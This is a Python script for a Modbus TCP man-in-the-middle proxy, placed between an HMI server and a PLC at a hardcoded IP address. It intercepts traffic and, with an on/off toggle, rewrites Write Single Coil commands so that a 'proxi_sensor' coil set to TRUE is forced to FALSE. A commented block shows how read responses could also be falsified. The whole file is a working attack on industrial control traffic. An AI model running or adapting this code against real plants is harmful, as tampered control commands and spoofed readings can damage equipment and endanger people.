#!/usr/bin/env python3
"""
Modbus TCP Man-in-the-Middle Proxy
Sits between WebSocket HMI Server and actual PLC
Intercepts and modifies Modbus traffic in real-time
"""

import socket
import select
import struct
import threading
import sys

# Proxy Configuration
PROXY_LISTEN_IP = '0.0.0.0'
PROXY_LISTEN_PORT = 502

# Real PLC address (can be overridden via command line)
REAL_PLC_IP = '129.212.183.179'
REAL_PLC_PORT = 502

# Attack Toggle State
ATTACK_ENABLED = True

# Statistics
stats = {
    'packets_intercepted': 0,
    'packets_modified': 0,
    'connections': 0
}


def attack_toggle_listener():
    """Background thread to toggle attack on/off"""
    global ATTACK_ENABLED
    print("\n[CONTROL] Press 'O' + Enter to toggle attack ON/OFF")
    print("[CONTROL] Press 'S' + Enter to show statistics")
    print("[CONTROL] Press 'Q' + Enter to quit\n")

    while True:
        try:
            user_input = input().strip().lower()
            if user_input == "o":
                ATTACK_ENABLED = not ATTACK_ENABLED
                status = "ENABLED" if ATTACK_ENABLED else "DISABLED"
                print(f"\n[ATTACK] 🔴 Attack is now {status}\n")
            elif user_input == "s":
                print(f"\n[STATS] Connections: {stats['connections']}")
                print(f"[STATS] Packets intercepted: {stats['packets_intercepted']}")
                print(f"[STATS] Packets modified: {stats['packets_modified']}\n")
            elif user_input == "q":
                print("\n[INFO] Shutting down proxy...")
                sys.exit(0)
        except EOFError:
            break
        except Exception as e:
            print(f"[ERROR] Input error: {e}")


def intercept_and_modify(data: bytes, direction: str) -> bytes:
    """
    Intercept and modify Modbus packets

    Args:
        data: Raw Modbus TCP packet bytes
        direction: 'to_plc' or 'from_plc'

    Returns:
        Modified or original packet
    """
    global stats

    if not ATTACK_ENABLED:
        return data

    # Modbus TCP minimum length check
    if len(data) < 12:
        return data

    stats['packets_intercepted'] += 1

    try:
        # Parse Modbus TCP header (MBAP)
        trans_id = struct.unpack(">H", data[0:2])[0]
        proto_id = struct.unpack(">H", data[2:4])[0]
        length = struct.unpack(">H", data[4:6])[0]
        unit_id = data[6]
        func_code = data[7]

        # Function Code 5: Write Single Coil
        if func_code == 5 and direction == 'to_plc':
            output_address = struct.unpack(">H", data[8:10])[0]
            output_value = struct.unpack(">H", data[10:12])[0]

            print(f"[INTERCEPT] FC5 Write Coil: addr={output_address}, value=0x{output_value:04x} (trans_id={trans_id})")

            # ATTACK: If writing TRUE to proxi_sensor (address 0), change to FALSE
            if output_address == 0 and output_value == 0xFF00:
                print(f"[ATTACK] 🎯 Changing proxi_sensor TRUE → FALSE")
                data = data[:10] + b"\x00\x00" + data[12:]
                stats['packets_modified'] += 1
                print(f"[ATTACK] ✓ Packet modified (trans_id={trans_id})")

        # Function Code 1: Read Coils (Request)
        elif func_code == 1 and direction == 'to_plc':
            start_address = struct.unpack(">H", data[8:10])[0]
            quantity = struct.unpack(">H", data[10:12])[0]
            print(f"[INTERCEPT] FC1 Read Coils Request: start={start_address}, count={quantity} (trans_id={trans_id})")

        # Function Code 1: Read Coils (Response)
        elif func_code == 1 and direction == 'from_plc' and len(data) >= 10:
            byte_count = data[8]
            if len(data) >= 9 + byte_count:
                coil_values = data[9:9+byte_count]
                print(f"[INTERCEPT] FC1 Read Coils Response: {coil_values.hex()} (trans_id={trans_id})")

                # Optional: Could also modify responses here
                # For example, always return FALSE for flash_light
                # if byte_count >= 1:
                #     data = data[:9] + b"\x00" + data[10:]
                #     print(f"[ATTACK] Modified read response to FALSE")

    except Exception as e:
        print(f"[ERROR] Exception parsing packet: {e}")

    return data


def handle_connection(client_sock, client_addr):
    """Handle a single client connection"""
    global stats
    stats['connections'] += 1
    conn_id = stats['connections']

    print(f"\n[CONNECTION {conn_id}] 🔌 New connection from {client_addr}")

    # Connect to real PLC
    try:
        plc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plc_sock.connect((REAL_PLC_IP, REAL_PLC_PORT))
        print(f"[CONNECTION {conn_id}] ✓ Connected to PLC at {REAL_PLC_IP}:{REAL_PLC_PORT}")
    except Exception as e:
        print(f"[CONNECTION {conn_id}] ✗ Failed to connect to PLC: {e}")
        client_sock.close()
        return

    sockets = [client_sock, plc_sock]

    try:
        while True:
            # Wait for data from either socket
            readable, _, exceptional = select.select(sockets, [], sockets, 60)

            if exceptional:
                print(f"[CONNECTION {conn_id}] ⚠ Socket exception")
                break

            for sock in readable:
                try:
                    data = sock.recv(4096)

                    if not data:
                        print(f"[CONNECTION {conn_id}] Connection closed")
                        raise ConnectionError("Connection closed")

                    # Determine direction and process
                    if sock is client_sock:
                        # Data from HMI to PLC
                        modified_data = intercept_and_modify(data, 'to_plc')
                        plc_sock.sendall(modified_data)
                    else:
                        # Data from PLC to HMI
                        modified_data = intercept_and_modify(data, 'from_plc')
                        client_sock.sendall(modified_data)

                except Exception as e:
                    print(f"[CONNECTION {conn_id}] Error processing data: {e}")
                    raise

    except Exception as e:
        print(f"[CONNECTION {conn_id}] ✗ Error: {e}")

    finally:
        client_sock.close()
        plc_sock.close()
        print(f"[CONNECTION {conn_id}] 🔌 Connection closed")


def main():
    """Main proxy loop"""
    global REAL_PLC_IP, REAL_PLC_PORT

    # Parse command line arguments
    if len(sys.argv) >= 2:
        REAL_PLC_IP = sys.argv[1]
    if len(sys.argv) >= 3:
        REAL_PLC_PORT = int(sys.argv[2])

    print("=" * 70)
    print("🎭 MODBUS TCP MAN-IN-THE-MIDDLE PROXY")
    print("=" * 70)
    print(f"[CONFIG] Listening on {PROXY_LISTEN_IP}:{PROXY_LISTEN_PORT}")
    print(f"[CONFIG] Forwarding to PLC at {REAL_PLC_IP}:{REAL_PLC_PORT}")
    print(f"[ATTACK] Initial state: {'ENABLED' if ATTACK_ENABLED else 'DISABLED'}")
    print("=" * 70)

    # Start control thread
    control_thread = threading.Thread(target=attack_toggle_listener, daemon=True)
    control_thread.start()

    # Create listening socket
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_sock.bind((PROXY_LISTEN_IP, PROXY_LISTEN_PORT))
        server_sock.listen(5)
        print(f"\n[PROXY] 🚀 Ready! Waiting for HMI connections...\n")

        while True:
            client_sock, client_addr = server_sock.accept()

            # Handle each connection in a thread
            client_thread = threading.Thread(
                target=handle_connection,
                args=(client_sock, client_addr),
                daemon=True
            )
            client_thread.start()

    except KeyboardInterrupt:
        print("\n\n[SHUTDOWN] Caught Ctrl+C, shutting down...")
    except Exception as e:
        print(f"\n[ERROR] Server error: {e}")
    finally:
        server_sock.close()
        print("[SHUTDOWN] ✓ Proxy stopped")
        print(f"\n[FINAL STATS]")
        print(f"  Total connections: {stats['connections']}")
        print(f"  Packets intercepted: {stats['packets_intercepted']}")
        print(f"  Packets modified: {stats['packets_modified']}")


if __name__ == '__main__':
    main()
